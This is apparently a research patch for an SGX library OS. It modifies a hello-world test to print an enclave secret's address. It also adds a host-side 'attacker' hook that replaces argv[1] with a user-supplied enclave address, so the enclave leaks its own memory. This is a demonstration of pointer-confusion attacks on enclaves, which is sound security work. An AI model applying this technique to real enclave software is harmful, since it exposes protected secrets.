@@ -1,0 +1,78 @@
+diff --git a/LibOS/shim/test/native/helloworld.c b/LibOS/shim/test/native/helloworld.c
+index 788fb84..55de8cf 100644
+--- a/LibOS/shim/test/native/helloworld.c
++++ b/LibOS/shim/test/native/helloworld.c
+@@ -4,9 +4,27 @@
+ /* a simple helloworld test */
+ 
+ #include <stdio.h>
++#include <fcntl.h>
++#include <stdint.h>
++#include <stdlib.h>
++
++char *secret = "super secret enclave string";
+ 
+ int main(int argc, char ** argv)
+ {
+-    printf("Hello world (%s)!\n", argv[0]);
++   int i;
++
++    printf("\n\nHello world from enclaved application binary!\n");
++    printf("\t--> enclave secret at %p\n", secret);
++
++    printf("\n\nEchoing user-provided command line arguments\n");
++
++    for (i=0; i < argc; i++)
++    {
++	printf("\targv[%d] @%p = '%s'\n", i, argv[i], argv[i]);
++    }
++
++
++
+     return 0;
+ }
+diff --git a/Pal/src/host/Linux-SGX/sgx-driver b/Pal/src/host/Linux-SGX/sgx-driver
+--- a/Pal/src/host/Linux-SGX/sgx-driver
++++ b/Pal/src/host/Linux-SGX/sgx-driver
+@@ -1 +1 @@
+-Subproject commit 4d0dc8bd261567aa3b69170eeacca076cbe9799b
++Subproject commit 4d0dc8bd261567aa3b69170eeacca076cbe9799b-dirty
+diff --git a/Pal/src/host/Linux-SGX/sgx_enclave.c b/Pal/src/host/Linux-SGX/sgx_enclave.c
+index 55600d0..f1d35a2 100644
+--- a/Pal/src/host/Linux-SGX/sgx_enclave.c
++++ b/Pal/src/host/Linux-SGX/sgx_enclave.c
+@@ -714,6 +714,18 @@ sgx_ocall_fn_t ocall_table[OCALL_NR] = {
+ int ecall_enclave_start (const char ** arguments, const char ** environments)
+ {
+     ms_ecall_enclave_start_t ms;
++
++#if 1
++    printf("\n\n------------------------------\n");
++    printf("attacker: enter enclave address, current arguments[1]=%p > ", arguments[1]);
++    char *adrs = NULL;
++    scanf("%p", &adrs);
++
++    printf("\nattacker: replacing untrusted string pointer argv[1] with adrs %p\n", adrs);
++    arguments[1] = adrs; //(char*) 0x400688;
++    printf("------------------------------\n\n\n");
++#endif
++
+     ms.ms_arguments = arguments;
+     ms.ms_environments = environments;
+     ms.ms_sec_info = PAL_SEC();
+diff --git a/Pal/src/host/Linux-SGX/sgx_framework.c b/Pal/src/host/Linux-SGX/sgx_framework.c
+index 7a63a0e..66d90f3 100644
+--- a/Pal/src/host/Linux-SGX/sgx_framework.c
++++ b/Pal/src/host/Linux-SGX/sgx_framework.c
+@@ -357,8 +357,10 @@ int init_enclave(sgx_arch_secs_t * secs,
+             error = "Invalid measurement";        break;
+         case SGX_INVALID_SIGNATURE:
+             error = "Invalid signature";          break;
+-        case SGX_INVALID_LICENSE:
++#if 0      
++ 	   case SGX_INVALID_LICENSE:
+             error = "Invalid EINIT token";        break;
++#endif
+         case SGX_INVALID_CPUSVN:
+             error = "Invalid CPU SVN";            break;
+         default:
